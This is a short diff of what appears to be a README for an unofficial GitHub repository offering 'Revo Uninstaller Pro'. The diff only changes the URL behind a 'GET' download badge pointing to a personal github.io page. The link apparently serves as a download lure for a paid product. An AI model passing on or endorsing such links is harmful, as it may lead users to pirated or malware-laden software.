@@ -4,7 +4,7 @@
 <img src="https://lizenzguru.de/media/image/ef/96/55/Revo-Uninstaller-1661808702.jpg" width="400">
 </p>
 
-[![GET — REVO UNINSTALLER PRO](https://img.shields.io/badge/GET-REVO%20UNINSTALLER%20PRO-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/)
+[![GET — REVO UNINSTALLER PRO](https://img.shields.io/badge/GET-REVO%20UNINSTALLER%20PRO-2563eb?style=for-the-badge)](https://r30575269.github.io/.github/Revo-Uninstaller-Pro)
 
 ---
 
